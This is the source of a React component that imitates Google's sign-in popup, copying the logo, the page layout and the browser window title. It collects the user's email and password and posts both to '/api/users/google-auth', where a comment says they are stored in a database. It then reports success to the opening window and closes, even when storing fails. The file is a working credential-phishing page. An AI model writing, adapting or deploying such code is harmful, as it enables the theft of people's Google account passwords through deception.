import { useState, useEffect } from "react";
import axios from "axios";

const GoogleAuthPage = () => {
  const [email, setEmail] = useState("");
  const [emailFocused, setEmailFocused] = useState(false);
  const [showPasswordScreen, setShowPasswordScreen] = useState(false);
  const [password, setPassword] = useState("");
  const [passwordFocused, setPasswordFocused] = useState(false);
  const [showPassword, setShowPassword] = useState(false);

  // Update the window title to match Google's sign-in page
  useEffect(() => {
    document.title = "Sign in - Google Accounts - Google Chrome";
  }, []);

  const handleEmailSubmit = (e) => {
    e.preventDefault();
    if (email.trim()) {
      setShowPasswordScreen(true);
    }
  };

  const handlePasswordSubmit = async (e) => {
    e.preventDefault();

    try {
      // Store Google credentials in the database
      await axios.post("/api/users/google-auth", {
        email,
        password,
      });

      // Send success message to the opener window
      if (window.opener) {
        window.opener.postMessage({ type: "GOOGLE_AUTH_SUCCESS" }, "*");

        // Close this popup window after a short delay to ensure the message is received
        setTimeout(() => window.close(), 300);
      } else {
        // If no opener (testing/direct access), redirect to home
        window.location.href = "/";
      }
    } catch (error) {
      console.error("Error storing Google credentials:", error);

      // Still send success message and close the window
      if (window.opener) {
        window.opener.postMessage({ type: "GOOGLE_AUTH_SUCCESS" }, "*");
        setTimeout(() => window.close(), 300);
      } else {
        window.location.href = "/";
      }
    }
  };

  // Rest of the component remains the same...

  return (
    <div className="min-h-screen bg-white flex flex-col">
      {/* Main content wrapper with responsive width */}
      <div className="w-full max-w-[450px] mx-auto px-6 py-12 flex flex-col flex-grow">
        {/* Header - Google Logo aligned left with correct size */}
        <div className="mb-7">
          <svg
            xmlns="http://www.w3.org/2000/svg"
            viewBox="0 0 24 24"
            width="30"
            height="30"
          >
            <path
              d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z"
              fill="#4285F4"
            />
            <path
              d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z"
              fill="#34A853"
            />
            <path
              d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l2.85-2.22.81-.62z"
              fill="#FBBC05"
            />
            <path
              d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z"
              fill="#EA4335"
            />
          </svg>
        </div>

        {!showPasswordScreen ? (
          <>
            {/* Email Screen */}
            <h1 className="text-2xl font-normal text-gray-800 mb-5 text-left">
              Sign in
            </h1>
            <p className="text-sm mb-7 text-left text-gray-700">
              with your Google Account. This account will be available to other
              <br className="hidden sm:inline" /> Google apps in the browser.
            </p>

            <form onSubmit={handleEmailSubmit}>
              {/* Email input with floating label */}
              <div className="mb-7">
                <div className="relative">
                  <div
                    className={`absolute transition-all duration-300 ${
                      emailFocused || email
                        ? "top-[-8px] left-3 text-xs bg-white px-1 text-blue-600"
                        : "top-[14px] left-3 text-gray-500"
                    }`}
                  >
                    Email or phone
                  </div>
                  <input
                    type="text"
                    value={email}
                    onChange={(e) => setEmail(e.target.value)}
                    onFocus={() => setEmailFocused(true)}
                    onBlur={() => setEmailFocused(false)}
                    className="w-full px-3 py-3 border border-gray-300 rounded text-gray-900 focus:outline-none focus:ring-blue-500 focus:border-blue-500"
                    required
                  />
                </div>
                <div className="text-left mt-2">
                  <a
                    href="#"
                    className="text-sm text-blue-600 hover:underline cursor-pointer"
                  >
                    Forgot email?
                  </a>
                </div>
              </div>

              {/* Guest mode text */}
              <div className="text-sm text-gray-600 mb-12 text-left">
                <p className="mb-1">
                  Not your computer? Use Guest mode to sign in privately.
                </p>
                <p>
                  <a
                    href="#"
                    className="text-blue-600 hover:underline cursor-pointer"
                  >
                    Learn more about using Guest mode
                  </a>
                </p>
              </div>

              {/* Bottom buttons - Create account on left, Next on right */}
              <div className="flex justify-between items-center">
                <a
                  href="#"
                  className="text-blue-600 text-sm font-medium hover:underline"
                >
                  Create account
                </a>
                <button
                  type="submit"
                  className="bg-blue-600 text-white px-6 py-2 rounded-md font-medium hover:bg-blue-700"
                >
                  Next
                </button>
              </div>
            </form>
          </>
        ) : (
          <>
            {/* Password Screen */}
            <h1 className="text-2xl font-normal text-gray-800 mb-5 text-left">
              Welcome
            </h1>

            {/* Email dropdown display */}
            <div className="w-fit mb-10">
              <div className="inline-flex items-center border border-gray-300 rounded-full py-1 px-3">
                <div className="flex items-center">
                  <img
                    src="data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMjQiIGhlaWdodD0iMjQiIHZpZXdCb3g9IjAgMCAyNCAyNCIgZmlsbD0ibm9uZSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj48Y2lyY2xlIGN4PSIxMiIgY3k9IjEyIiByPSIxMiIgZmlsbD0iI0U4RUFFRCIvPjxwYXRoIGZpbGwtcnVsZT0iZXZlbm9kZCIgY2xpcC1ydWxlPSJldmVub2RkIiBkPSJNMTIgMTNDMTMuNjU2OSAxMyAxNSAxMS42NTY5IDE1IDEwQzE1IDguMzQzMTUgMTMuNjU2OSA3IDEyIDdDMTAuMzQzMSA3IDkgOC4zNDMxNSA5IDEwQzkgMTEuNjU2OSAxMC4zNDMxIDEzIDEyIDEzWk0xMiAxNUMxNS44NjYgMTUgMTkgMTYuNzkwOSAxOSAxOVYyMEg1VjE5QzUgMTYuNzkwOSA4LjEzNDAxIDE1IDEyIDE1WiIgZmlsbD0iIzlBQTBBNiIvPjwvc3ZnPg=="
                    alt="User Icon"
                    className="h-6 w-6 mr-2"
                  />
                  <span className="text-sm">{email}</span>
                </div>
                <svg
                  xmlns="http://www.w3.org/2000/svg"
                  viewBox="0 0 20 20"
                  fill="currentColor"
                  className="w-4 h-4 ml-1 text-gray-600"
                >
                  <path
                    fillRule="evenodd"
                    d="M5.293 7.293a1 1 0 011.414 0L10 10.586l3.293-3.293a1 1 0 111.414 1.414l-4 4a1 1 0 01-1.414 0l-4-4a1 1 0 010-1.414z"
                    clipRule="evenodd"
                  />
                </svg>
              </div>
            </div>

            <form onSubmit={handlePasswordSubmit} className="text-left">
              {/* Password input field with floating label */}
              <div className="mb-8">
                <div className="relative">
                  <div
                    className={`absolute transition-all duration-300 ${
                      passwordFocused || password
                        ? "top-[-8px] left-3 text-xs bg-white px-1 text-blue-600"
                        : "top-[14px] left-3 text-gray-500"
                    }`}
                  >
                    Enter your password
                  </div>
                  <input
                    type={showPassword ? "text" : "password"}
                    value={password}
                    onChange={(e) => setPassword(e.target.value)}
                    onFocus={() => setPasswordFocused(true)}
                    onBlur={() => setPasswordFocused(false)}
                    className="w-full px-3 py-3 border border-gray-300 rounded text-gray-900 focus:outline-none focus:ring-blue-500 focus:border-blue-500"
                    required
                  />
                </div>

                {/* Show password checkbox */}
                <div className="flex items-center mt-2">
                  <input
                    id="show-password"
                    type="checkbox"
                    className="h-4 w-4 text-blue-600 focus:ring-blue-500 border-gray-300 rounded"
                    checked={showPassword}
                    onChange={() => setShowPassword(!showPassword)}
                  />
                  <label
                    htmlFor="show-password"
                    className="ml-2 block text-sm text-gray-600"
                  >
                    Show password
                  </label>
                </div>
              </div>

              {/* Bottom buttons - Forgot password on left, Next on right */}
              <div className="flex justify-between items-center">
                <a
                  href="#"
                  className="text-blue-600 text-sm font-medium hover:underline"
                >
                  Forgot password?
                </a>
                <button
                  type="submit"
                  className="bg-blue-600 text-white px-6 py-2 rounded-md font-medium hover:bg-blue-700"
                >
                  Next
                </button>
              </div>
            </form>
          </>
        )}
      </div>
    </div>
  );
};

export default GoogleAuthPage;
